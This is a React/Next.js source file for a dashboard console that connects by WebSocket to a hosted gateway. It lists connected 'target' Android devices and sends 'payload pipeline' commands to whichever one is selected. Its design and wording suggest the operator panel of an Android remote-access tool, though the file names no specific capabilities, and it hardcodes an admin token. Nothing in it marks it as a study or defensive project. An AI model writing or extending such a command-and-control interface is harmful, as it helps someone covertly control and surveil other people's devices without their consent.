"use client";
import { useState, useEffect } from "react";
import DashboardNav from "@/components/DashboardNav";
import ControlGrid from "@/components/ControlGrid";
import { Card } from "@/components/ui/Card";
import { io, Socket } from "socket-io-client";
import { Smartphone, Radio, Terminal, Cpu, Search, Activity } from "lucide-react";
import { TargetDevice, NetworkLog } from "@/types";

const SOCKET_ENDPOINT = process.env.NEXT_PUBLIC_SOCKET_URL || "https://rayanxweb-gateway.onrender.com";

export default function DashboardConsole() {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [devices, setDevices] = useState<TargetDevice[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [logs, setLogs] = useState<NetworkLog[]>([]);
  const [latency, setLatency] = useState<number>(0);

  useEffect(() => {
    const s = io(SOCKET_ENDPOINT, { transports: ["websocket"] });

    s.on("connect", () => {
      s.emit("register_dashboard", { token: "ADMIN_SECURE_TOKEN_XYZ" });
      pushLog("INFO", "WebSocket pipeline connection secure.");
      
      // Ping Interval Loop
      setInterval(() => {
        const start = Date.now();
        s.emit("ping_check", () => {
          setLatency(Date.now() - start);
        });
      }, 4000);
    });

    s.on("device_snapshot", (snapshot: TargetDevice[]) => {
      setDevices(snapshot);
      if (snapshot.length > 0) setSelectedId(snapshot[0].deviceId);
    });

    s.on("device_online", (dev: TargetDevice) => {
      setDevices(prev => [...prev.filter(d => d.deviceId !== dev.deviceId), dev]);
      setSelectedId(dev.deviceId);
      pushLog("INFO", `Target connected: ${dev.model}`);
    });

    s.on("device_offline", (data: { deviceId: string }) => {
      setDevices(prev => prev.filter(d => d.deviceId !== data.deviceId));
      setSelectedId(curr => curr === data.deviceId ? null : curr);
      pushLog("WARN", `Target channel closed: ${data.deviceId}`);
    });

    setSocket(s);
    return () => { s.disconnect(); };
  }, []);

  const pushLog = (type: 'INFO' | 'CMD' | 'WARN', message: string) => {
    const freshLog: NetworkLog = {
      timestamp: new Date().toLocaleTimeString(),
      type,
      message
    };
    setLogs(prev => [freshLog, ...prev.slice(0, 8)]);
  };

  const handleCommandExecution = (actionId: string) => {
    if (!selectedId) return alert("Error: No active Android client pipeline bound.");
    if (!socket) return;

    socket.emit("relay_instruction", { targetId: selectedId, action: actionId });
    pushLog("CMD", `Payload pipeline execution triggered [${actionId.toUpperCase()}]`);
  };

  const filteredDevices = devices.filter(d => 
    d.model.toLowerCase().includes(search.toLowerCase()) || d.deviceId.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <main className="min-h-screen pb-32 pt-6 px-4 max-w-md mx-auto text-slate-300">
      {/* HUD Bar Components */}
      <div className="grid grid-cols-4 gap-2 mb-4">
        {[
          { label: "NET PING", val: `${latency}ms`, icon: Activity, col: "text-cyan-400" },
          { label: "CONNECTED", val: devices.length, icon: Radio, col: "text-emerald-400" },
          { label: "IDLE UNIT", val: 0, icon: Cpu, col: "text-amber-400" },
          { label: "LOG SYSTEM", val: logs.length, icon: Terminal, col: "text-purple-400" }
        ].map((item, i) => (
          <div key={i} className="bg-panelDark rounded-2xl p-2.5 text-center shadow-neumorphicOut border border-slate-800/20">
            <div className="flex justify-center mb-1"><item.icon size={13} className={item.col} /></div>
            <p className="text-[7.5px] font-bold text-slate-500 uppercase tracking-widest">{item.label}</p>
            <p className="text-xs font-black text-white mt-0.5">{item.val}</p>
          </div>
        ))}
      </div>

      {/* Client Pipeline Registry Selector */}
      <Card className="p-4 mb-4">
        <div className="relative mb-3">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-600" size={13} />
          <input 
            type="text" 
            placeholder="Search target identifier..." 
            value={search} 
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-bgDark text-[11px] rounded-xl p-2.5 pl-9 text-slate-300 outline-none shadow-neumorphicInset border border-transparent focus:border-neonCyan/10 transition-all"
          />
        </div>
        <div className="flex gap-2 overflow-x-auto pb-1">
          {filteredDevices.map(d => (
            <button 
              key={d.deviceId} 
              onClick={() => setSelectedId(d.deviceId)}
              className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[10px] font-mono shrink-0 transition-all duration-200 ${selectedId === d.deviceId ? 'bg-bgDark text-neonCyan shadow-neumorphicInset border border-neonCyan/20' : 'bg-bgDark/40 text-slate-500'}`}
            >
              <Smartphone size={10} />
              <span>{d.model} ({d.deviceId.substring(0,4)})</span>
            </button>
          ))}
          {filteredDevices.length === 0 && <span className="text-[9px] text-slate-600 tracking-wider w-full text-center py-1 uppercase">Awaiting WebSocket Inbound Tunnels...</span>}
        </div>
      </Card>

      {/* Grid Controller Component Core */}
      <div className="mb-4">
        <ControlGrid onActionTrigger={handleCommandExecution} />
      </div>

      {/* Terminal Display Block */}
      <div className="bg-panelDark rounded-3xl p-4 shadow-neumorphicOut font-mono text-[9px] border border-slate-800/10">
        <p className="text-slate-500 font-bold border-b border-slate-800/60 pb-1.5 tracking-widest flex items-center gap-1.5 uppercase">
          <Terminal size={11} className="text-neonCyan" /> Network Event Stream
        </p>
        <div className="mt-2.5 space-y-1.5 max-h-[110px] overflow-y-auto">
          {logs.map((l, i) => (
            <div key={i} className="text-slate-400 flex items-start gap-1">
              <span className="text-slate-600">[{l.timestamp}]</span>
              <span className={l.type === 'WARN' ? 'text-red-400' : l.type === 'CMD' ? 'text-neonCyan' : 'text-emerald-400'}>{l.type}</span>
              <span className="truncate max-w-[280px] text-slate-400">- {l.message}</span>
            </div>
          ))}
          {logs.length === 0 && <div className="text-slate-600 italic">No events broadcasted inside current session.</div>}
        </div>
      </div>

      <DashboardNav />
    </main>
  );
}
